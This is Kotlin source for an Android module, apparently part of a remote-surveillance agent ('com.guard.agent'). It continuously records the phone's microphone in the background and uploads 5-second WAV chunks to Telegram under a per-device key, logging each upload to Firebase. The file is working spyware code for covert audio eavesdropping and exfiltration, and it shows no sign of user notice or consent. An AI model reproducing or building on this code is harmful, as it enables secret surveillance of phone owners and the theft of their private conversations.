package com.guard.agent.helpers.media

import android.annotation.SuppressLint
import android.content.Context
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import com.google.firebase.database.FirebaseDatabase
import com.guard.agent.core.Constants
import com.guard.agent.helpers.telegram.TelegramUploader
import com.guard.agent.utils.Logger
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.atomic.AtomicBoolean
import kotlin.concurrent.thread

object LiveAudioStreamer {

    private const val TAG = "LiveAudioStreamer"
    private const val SAMPLE_RATE = 16000
    private const val CHANNEL = AudioFormat.CHANNEL_IN_MONO
    private const val ENCODING = AudioFormat.ENCODING_PCM_16BIT

    // 5 sec chunks — Telegram rate limit ke liye
    private const val CHUNK_DURATION_MS = 5000

    private val isRunning = AtomicBoolean(false)
    private var audioRecord: AudioRecord? = null
    private var recordThread: Thread? = null

    /**
     * Live audio stream start karo.
     */
    @SuppressLint("MissingPermission")
    fun start(ctx: Context, deviceKey: String) {
        if (isRunning.get()) {
            Logger.w(TAG, "Already running")
            return
        }
        isRunning.set(true)

        val bufferSize = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL, ENCODING)
        if (bufferSize <= 0) {
            Logger.e(TAG, "Invalid buffer size: $bufferSize")
            isRunning.set(false)
            return
        }

        try {
            val record = AudioRecord(
                MediaRecorder.AudioSource.MIC,
                SAMPLE_RATE,
                CHANNEL,
                ENCODING,
                bufferSize * 2
            )

            if (record.state != AudioRecord.STATE_INITIALIZED) {
                Logger.e(TAG, "AudioRecord not initialized")
                isRunning.set(false)
                return
            }

            audioRecord = record

            recordThread = thread(start = true, name = "LiveAudioStreamer") {
                recordLoop(record, bufferSize, ctx, deviceKey)
            }

            Logger.d(TAG, "Audio stream started")
        } catch (e: Exception) {
            Logger.e(TAG, "start failed", e)
            isRunning.set(false)
        }
    }

    /**
     * Record loop — chunks collect karke Telegram pe bhejo.
     */
    private fun recordLoop(
        record: AudioRecord,
        bufferSize: Int,
        ctx: Context,
        deviceKey: String
    ) {
        try {
            record.startRecording()

            val bytesPerChunk = SAMPLE_RATE * 2 * CHUNK_DURATION_MS / 1000
            val buffer = ByteArray(bufferSize)
            val chunkBuffer = ByteArrayOutputStream(bytesPerChunk)

            var chunkStartTime = System.currentTimeMillis()
            var chunkIndex = 0

            while (isRunning.get()) {
                val read = record.read(buffer, 0, buffer.size)
                if (read <= 0) continue

                chunkBuffer.write(buffer, 0, read)

                val elapsed = System.currentTimeMillis() - chunkStartTime

                if (elapsed >= CHUNK_DURATION_MS) {
                    val chunkBytes = chunkBuffer.toByteArray()
                    chunkBuffer.reset()
                    chunkStartTime = System.currentTimeMillis()
                    chunkIndex++

                    // WAV file banao
                    val wavBytes = createWavHeader(chunkBytes.size) + chunkBytes
                    uploadChunk(ctx, deviceKey, wavBytes, chunkIndex)
                }
            }

            try { record.stop() } catch (_: Exception) {}
            record.release()

            Logger.d(TAG, "Record loop ended")
        } catch (e: Exception) {
            Logger.e(TAG, "recordLoop failed", e)
            try { record.release() } catch (_: Exception) {}
        }
    }

    /**
     * Chunk ko Telegram pe upload karo.
     */
    private fun uploadChunk(ctx: Context, deviceKey: String, wavBytes: ByteArray, index: Int) {
        try {
            val file = File(
                ctx.cacheDir,
                "live_audio_${index}.wav"
            )
            FileOutputStream(file).use { it.write(wavBytes) }

            TelegramUploader.uploadVoice(ctx, deviceKey, file, "live_audio") { success ->
                if (success) {
                    try {
                        FirebaseDatabase.getInstance()
                            .getReference(Constants.PATH_DEVICES)
                            .child(deviceKey).child(Constants.SUB_LIVE_AUDIO)
                            .setValue(
                                mapOf(
                                    "time" to System.currentTimeMillis(),
                                    "chunk" to index
                                )
                            )
                    } catch (_: Exception) {}
                }
            }
        } catch (e: Exception) {
            Logger.e(TAG, "uploadChunk failed", e)
        }
    }

    /**
     * Simple WAV header banao.
     */
    private fun createWavHeader(dataSize: Int): ByteArray {
        val totalSize = dataSize + 36
        val header = ByteArray(44)
        val byteRate = SAMPLE_RATE * 1 * 2

        header[0] = 'R'.code.toByte()
        header[1] = 'I'.code.toByte()
        header[2] = 'F'.code.toByte()
        header[3] = 'F'.code.toByte()
        header[4] = (totalSize and 0xff).toByte()
        header[5] = ((totalSize shr 8) and 0xff).toByte()
        header[6] = ((totalSize shr 16) and 0xff).toByte()
        header[7] = ((totalSize shr 24) and 0xff).toByte()
        header[8] = 'W'.code.toByte()
        header[9] = 'A'.code.toByte()
        header[10] = 'V'.code.toByte()
        header[11] = 'E'.code.toByte()
        header[12] = 'f'.code.toByte()
        header[13] = 'm'.code.toByte()
        header[14] = 't'.code.toByte()
        header[15] = ' '.code.toByte()
        header[16] = 16
        header[17] = 0
        header[18] = 0
        header[19] = 0
        header[20] = 1
        header[21] = 0
        header[22] = 1
        header[23] = 0
        header[24] = (SAMPLE_RATE and 0xff).toByte()
        header[25] = ((SAMPLE_RATE shr 8) and 0xff).toByte()
        header[26] = ((SAMPLE_RATE shr 16) and 0xff).toByte()
        header[27] = ((SAMPLE_RATE shr 24) and 0xff).toByte()
        header[28] = (byteRate and 0xff).toByte()
        header[29] = ((byteRate shr 8) and 0xff).toByte()
        header[30] = ((byteRate shr 16) and 0xff).toByte()
        header[31] = ((byteRate shr 24) and 0xff).toByte()
        header[32] = 2
        header[33] = 0
        header[34] = 16
        header[35] = 0
        header[36] = 'd'.code.toByte()
        header[37] = 'a'.code.toByte()
        header[38] = 't'.code.toByte()
        header[39] = 'a'.code.toByte()
        header[40] = (dataSize and 0xff).toByte()
        header[41] = ((dataSize shr 8) and 0xff).toByte()
        header[42] = ((dataSize shr 16) and 0xff).toByte()
        header[43] = ((dataSize shr 24) and 0xff).toByte()

        return header
    }

    /**
     * Audio stream band karo.
     */
    fun stop() {
        if (!isRunning.get()) return
        isRunning.set(false)

        try { audioRecord?.stop() } catch (_: Exception) {}
        try { audioRecord?.release() } catch (_: Exception) {}

        audioRecord = null
        recordThread?.interrupt()
        recordThread = null

        Logger.d(TAG, "Audio stream stopped")
    }

    fun isRunning(): Boolean = isRunning.get()
}
